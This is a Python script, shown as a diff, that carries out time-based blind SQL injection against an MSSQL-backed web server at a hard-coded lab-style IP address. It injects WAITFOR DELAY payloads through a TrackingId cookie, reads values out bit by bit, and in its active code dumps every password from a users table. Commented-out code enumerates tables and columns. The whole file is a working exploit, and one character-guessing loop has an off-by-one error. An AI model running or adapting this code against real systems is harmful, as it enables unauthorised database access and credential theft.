@@ -1,0 +1,99 @@
+#!/usr/bin/python3
+
+# module Oracle Design
+# blind sql injection - time based type
+
+import requests
+import time
+import sys
+import urllib.parse
+
+# Define the length of time (in seconds) the server should
+# wait if `q` is `true`
+DELAY = 3
+
+# Evalutes `q` on the server side and returns `true` or `false`
+def oracle(q):
+    beforeURLencoded = f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"
+    afterURLencoded = urllib.parse.quote(beforeURLencoded)
+    
+    start = time.time()
+    r = requests.get(
+        "http://10.129.204.202/",
+        headers={"Cookie": f"TrackingId={afterURLencoded}"}
+    )
+    return time.time() - start > DELAY
+
+def exfiltrate_dbname_fifth_char():
+    dictionary = "qwertyuiopasdfghjklzxcvbnm"
+    for i in range(1, 26+1):
+        print(dictionary[i])
+        if oracle(f"(select substring(db_name(), 5, 1)) = '{dictionary[i]}'"):
+            print(f"[+] The fifth letter of DB name: {dictionary[i]}")
+
+# Dump a number
+def dumpNumber(q):
+    length = 0
+    for p in range(7):
+        if oracle(f"({q})&{2**p}>0"):
+            length |= 2**p
+    return length
+
+# Dump a string
+def dumpString(q, length):
+    val = ""
+    print("[*] Dumped String = ", end='')
+    for i in range(1, length + 1):
+        c = 0
+        for p in range(7):
+            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
+                c |= 2**p
+        val += chr(c)
+        print(chr(c), end='')
+        sys.stdout.flush()
+    print()
+    return val
+
+# Verify that the oracle works by checking if the correct
+# values are returned for queries `1=1` and `1=0`
+#assert oracle("1=1")
+#assert not oracle("1=0")
+
+print(oracle("1=1"))
+#print(oracle("1=0"))
+#print(oracle("(select substring(db_name(), 5, 1)) = 'a'"))
+#exfiltrate_dbname_fifth_char()
+
+# db_name_length = dumpNumber("LEN(DB_NAME())")
+# print(f"[+] Length of DB name: {db_name_length}")
+
+# db_name = dumpString("DB_NAME()", db_name_length)
+# print(f"[+] DB name: {db_name}")
+
+# num_tables = dumpNumber("SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='d4y'")
+# print(num_tables)
+
+# for i in range(num_tables):
+#      table_name_length = dumpNumber(f"select LEN(table_name) from information_schema.tables where table_catalog='d4y' order by table_name offset {i} rows fetch next 1 rows only")
+#      print(table_name_length)
+#      table_name = dumpString(f"select table_name from information_schema.tables where table_catalog='d4y' order by table_name offset {i} rows fetch next 1 rows only", table_name_length)
+#      print(table_name)
+
+# num_columns = dumpNumber("select count(column_name) from INFORMATION_SCHEMA.columns where table_name='users' and table_catalog='d4y'")
+# print(num_columns)
+
+# for i in range(num_columns):
+#     column_name_length = dumpNumber(f"select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='users' and table_catalog='d4y' order by column_name offset {i} rows fetch next 1 rows only")
+#     print(column_name_length)
+#     column_name = dumpString(f"select column_name from INFORMATION_SCHEMA.columns where table_name='users' and table_catalog='d4y' order by column_name offset {i} rows fetch next 1 rows only", column_name_length)
+#     print(column_name)
+
+
+num_rows = dumpNumber("select count(*) from users")
+print(num_rows)
+
+for i in range(num_rows):
+    row_length = dumpNumber(f"select LEN(password) from users order by password offset {i} rows fetch next 1 rows only")
+    print(row_length)
+    row_value = dumpString(f"select password from users order by password offset {i} rows fetch next 1 rows only", row_length)
+    print(row_value)
